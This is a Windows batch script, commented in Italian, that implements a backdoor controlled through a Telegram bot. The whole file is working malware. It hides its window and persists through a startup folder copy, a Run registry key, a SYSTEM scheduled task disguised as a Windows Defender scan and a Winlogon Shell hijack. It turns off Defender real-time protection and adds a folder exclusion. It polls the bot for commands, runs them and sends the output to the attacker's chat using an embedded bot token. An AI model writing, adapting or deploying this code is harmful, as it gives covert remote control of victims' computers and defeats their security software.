@echo off
:: INIZIALIZZAZIONE STEALTH
if not "%1"=="--ghost" (
    call :makeInvisible
    exit
)

:: CONFIGURAZIONE BOT (sostituisci con i tuoi dati)
set "BOT_TOKEN=7711566157:AAEs2eaKEVqE5pWYLc9L4WiDIc8vS5n83hw"
set "CHAT_ID=5709299213"
set "API_URL=https://api.telegram.org/bot%BOT_TOKEN%"

:: AVVIO INVISIBILE
:ghostMode
setlocal enabledelayedexpansion

:: MECCANISMI DI PERSISTENZA (3 livelli)
call :addPersistence

:: NOTIFICA DI ATTIVAZIONE
powershell -nop -c "$null=Invoke-RestMethod -Uri '!API_URL!/sendMessage?chat_id=%CHAT_ID%&text=✅ [%COMPUTERNAME%] - Backdoor attiva (User: %USERNAME%)' -UseBasicParsing"

:: LOOP PRINCIPALE
:mainLoop
for /f "delims=" %%A in ('powershell -nop -c "$r=try{irm '!API_URL!/getUpdates?offset=-1' -UseBasicParsing|ConvertFrom-Json}catch{};$r.result[-1].message.text"') do (
    set "cmd=%%A"
)

if "!cmd!"=="exit" (
    powershell -nop -c "irm '!API_URL!/sendMessage?chat_id=%CHAT_ID%&text=❌ Sessione terminata' -UseBasicParsing"
    exit
) else if "!cmd!"=="kill" (
    taskkill /f /im taskmgr.exe /im cmd.exe /im powershell.exe >nul 2>&1
) else if "!cmd:~0,4!"=="cmd:" (
    set "exec=!cmd:~4!"
    for /f "delims=" %%B in ('!exec! 2^>^&1') do set "out=%%B"
    powershell -nop -c "irm '!API_URL!/sendMessage?chat_id=%CHAT_ID%&text=!out!' -UseBasicParsing"
)

:: RITARDO ANTI-DEBUG (7-15 secondi)
powershell -nop -c "Start-Sleep -Seconds (Get-Random -Minimum 7 -Maximum 15)"
goto mainLoop

:: FUNZIONI =========================================

:makeInvisible
:: Crea shortcut nascosta nell'avvio
echo Set oWS = WScript.CreateObject("WScript.Shell") > "%TEMP%\~tmpInvis.vbs"
echo sLinkFile = "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.vbs" >> "%TEMP%\~tmpInvis.vbs"
echo Set oLink = oWS.CreateShortcut(sLinkFile) >> "%TEMP%\~tmpInvis.vbs"
echo oLink.TargetPath = "%~f0" >> "%TEMP%\~tmpInvis.vbs"
echo oLink.Arguments = "--ghost" >> "%TEMP%\~tmpInvis.vbs"
echo oLink.WindowStyle = 7 >> "%TEMP%\~tmpInvis.vbs"
echo oLink.Save >> "%TEMP%\~tmpInvis.vbs"
cscript //nologo "%TEMP%\~tmpInvis.vbs" & del "%TEMP%\~tmpInvis.vbs"

:: Avvia la versione invisibile
start "" /B wscript.exe "%~f0" --ghost
exit /b

:addPersistence
:: 1. Startup Folder
copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsDefender.bat" >nul 2>&1

:: 2. Registry Run 
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsDefender" /t REG_SZ /d "\"%~f0\" --ghost" /f >nul 2>&1

:: 3. Scheduled Task (avvio con privilegi)
schtasks /create /tn "Microsoft\Windows Defender\MP Scheduled Scan" /tr "\"%~f0\" --ghost" /sc onlogon /ru SYSTEM /f >nul 2>&1

:: 4. Winlogon Notify (tecnica avanzata)
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "explorer.exe, %~f0" /f >nul 2>&1

:: 5. Disabilita Windows Defender
powershell -nop -c "Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath '%APPDATA%'" >nul 2>&1
exit /b

:cleanup
:: Auto-pulizia in caso di comando "exit"
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsDefender" /f >nul 2>&1
del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsDefender.bat" >nul 2>&1
schtasks /delete /tn "Microsoft\Windows Defender\MP Scheduled Scan" /f >nul 2>&1
exit
